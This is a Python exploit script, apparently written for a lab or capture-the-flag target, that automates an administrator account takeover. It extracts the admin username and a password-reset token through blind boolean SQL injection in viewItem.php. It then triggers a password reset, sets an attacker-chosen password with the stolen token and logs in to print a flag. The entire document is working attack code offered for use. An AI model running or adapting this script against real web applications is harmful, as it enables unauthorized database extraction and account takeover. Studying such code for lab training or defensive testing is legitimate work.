import requests
import argparse
import sys
import re

parser = argparse.ArgumentParser()
parser.add_argument('-t','--target', help='Target URL', required=True)
parser.add_argument('-p','--password', help='Password to set', required=True)
parser.add_argument('-d','--debug', help='Debug with proxy', required=False, action = 'store_const', const = True)
args = parser.parse_args()

s = requests.session()
http_proxy = 'http://127.0.0.1:8080'
proxyDict = {
            "http" : http_proxy,
            "https" : http_proxy
}
if args.debug:
    proxy = proxyDict
else:
    proxy = False

def request_token(target, username):
    print("\n[+] Requesting password reset token...")
    url = "http://%s/login/resetPassword.php" %target
    data = {"username": "%s" %username}
    res = s.post(url, data=data, proxies=proxy)
    if "Success" in res.text:
        print("[*] Passsword reset token request succeeded")
    else:
        print("[-] Password reset token request failed :-(")
        sys.exit(-1)

def viewitems_sqli(target, inj_string):
    bits ="0"
    return_value = 1

    for j in reversed(range(8)):
        inj_strings = "%s>>%s)+=%s" %(inj_string,j, return_value)
        url = "http://%s/item/viewItem.php?id=%s" %(target, inj_strings)
        res = s.get(url, proxies=proxy, allow_redirects=False)

        if res.status_code == 404:
            bits = bits + str("1")
            return_value = int(bits,2)
        else:
            bits = bits[:-1]
            bits = bits + str("0")
            bits = bits + str("1")
            return_value = int(bits,2)
    return int(bits[:8],2)

def inject(inj, target, r):
    extracted = ""
    for i in range(1,r):
        inj_string = "1+AND+(ascii(substring((select+%s+from+user+WHERE+id_level+=1+LIMIT+1),%s,1))" %(inj,i)
        retrieved_value = viewitems_sqli(target, inj_string)

        if (retrieved_value):
            extracted += chr(retrieved_value)
            extracted_char = chr(retrieved_value)
            sys.stdout.write(extracted_char)
            sys.stdout.flush()
        else:
            break

    return extracted

def change_password(target, token, password):

    print("\n[+] Using token to change password...")
    url = "http://%s/login/doResetPassword.php?token=%s"%(target, token)
    res = s.get(url, proxies=proxy)
    if 'Success' in res.text:
        print("[*] Valid token supplied. Reseting password..")
    else:
        sys.exit(-1)
    url = "http://%s/login/doChangePassword.php" %target
    data = {"token": "%s" %token, "password": "%s" %password}
    s.post(url, data=data, proxies=proxy)

def login(target, username, password):

    print("[+] Logging in with new credentials "+username+"/"+password+"...")
    url = "http://%s/login/checkLogin.php" %target
    data = {"username": "%s" %username, "password": "%s" %password}
    res = s.post(url, data=data, proxies=proxy)
    flag = re.findall(r'\w+:\s\w+',res.text)
    print("[*] "+flag[0])

def main ():


    try:
        target = args.target
        password = args.password

    except IndexError:
            print("[-] Usage python3 %s -t <target IP> -p <Password to set>" % sys.argv[0])
            print("[-] eg: python3 %s -t 172.17.0.2 -p Offsec123" % sys.argv[0])
            print("[-] Add -d or --debug flag to utilize Burp or ZAP proxies")
            sys.exit(-1)


    print("[+] Extrcting administrator Username via SQL Injection...")
    username = inject('username', target, 10)
    request_token(target, username)
    print("[+] Extracting token for "+username+" via SQL Injection...")
    token = inject('token', target, 16)
    change_password(target, token, password)
    login(target, username, password)

if __name__ == '__main__':

    main()
